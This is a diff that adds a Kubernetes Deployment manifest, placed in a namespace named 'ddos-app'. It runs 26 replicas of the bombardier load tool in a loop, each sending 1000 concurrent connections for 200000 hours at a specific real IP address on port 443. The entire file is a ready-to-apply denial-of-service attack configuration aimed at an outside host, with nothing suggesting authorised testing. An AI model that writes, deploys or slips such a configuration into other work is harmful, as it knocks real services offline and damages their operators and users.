@@ -1,0 +1,23 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: 178.248.233.32443
+  name: 178.248.233.32443
+  namespace: ddos-app
+spec:
+  replicas: 26
+  selector:
+    matchLabels:
+      app: 178.248.233.32443
+  template:
+    metadata:
+      labels:
+        app: 178.248.233.32443
+    spec:
+      containers:
+      - name: bombardier
+        image: alpine/bombardier
+        imagePullPolicy: IfNotPresent
+        command: ["/bin/sh"]
+        args: ["-c", "for run in $(seq 1 100000); do bombardier -c 1000 -d 200000h -r 10 -p i,p,r 178.248.233.32:443; done"]
